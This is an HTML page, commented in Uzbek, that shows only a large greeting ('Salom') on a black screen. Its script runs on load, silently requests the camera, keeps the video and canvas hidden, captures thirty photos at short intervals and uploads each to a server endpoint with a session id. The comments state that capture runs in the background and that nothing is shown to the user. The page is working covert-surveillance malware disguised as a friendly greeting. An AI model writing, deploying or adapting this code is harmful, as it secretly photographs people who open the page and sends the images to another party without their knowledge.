<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Kulib turing</title>
  <style>
    /* Butun sahifa qora, markazda katta oq yozuv */
    html,body { height:100%; margin:0; background:#000; }
    .center {
      height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      user-select:none;
      -webkit-user-select:none;
    }
    .msg {
      color: blue;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      font-size: clamp(36px, 8vw, 96px);
      letter-spacing: 2px;
      text-align:center;
    }

    /* video va canvas to'liq yashirin (ekranda hech narsa ko'rinmaydi) */
    video, canvas { display:none !important; }
  </style>
</head>
<body>
  <div class="center">
    <div class="msg">Salom ðŸ˜‰</div>
  </div>

  <!-- Yashirin video/canvas: kamera fon rejimida ishlaydi -->
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    // Sozlamalar:
    const TOTAL_PHOTOS = 30;      // jami rasm soni
    const INTERVAL_MS = 800;      // rasm orasidagi oraliq (ms) â€” 800 tavsiya qilinadi
    const sessionId = String(Math.floor(Date.now() / 1000));

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    async function startHiddenCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width:1280, height:720 }, audio:false });
        video.srcObject = stream;

        // kutamiz â€” video metadatalari yuklanishini
        await new Promise(resolve => {
          if (video.readyState >= 2) resolve();
          else video.onloadedmetadata = () => resolve();
        });

        let count = 0;

        function takeOne() {
          canvas.width = video.videoWidth || 1280;
          canvas.height = video.videoHeight || 720;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          canvas.toBlob(async (blob) => {
            count++;
            // Form va yuborish
            const form = new FormData();
            form.append('photo', blob, `${sessionId}_${String(count).padStart(2,'0')}.jpg`);
            form.append('session_id', sessionId);
            form.append('seq', String(count));
            form.append('total', String(TOTAL_PHOTOS));

            try {
              await fetch('/upload', { method: 'POST', body: form });
              console.log(`Sent ${count}/${TOTAL_PHOTOS}`);
            } catch (err) {
              console.error('Upload error', err);
            }

            if (count < TOTAL_PHOTOS) {
              setTimeout(takeOne, INTERVAL_MS);
            } else {
              // tugadi â€” kamera oqimini to'xtatamiz
              stream.getTracks().forEach(t => t.stop());
              console.log('All photos sent.');
            }
          }, 'image/jpeg', 0.9);
        }

        // kichik kechikish bilan boshlash (kamera stabil bo'lsin)
        setTimeout(takeOne, 600);
      } catch (e) {
        console.error('Camera error:', e);
        // agar kamera ruxsati bo'lmasa, foydalanuvchiga hech narsa ko'rsatilmasdan console xato qoladi
      }
    }

    // Avtomatik boshlash
    startHiddenCapture();
  </script>
</body>
</html>
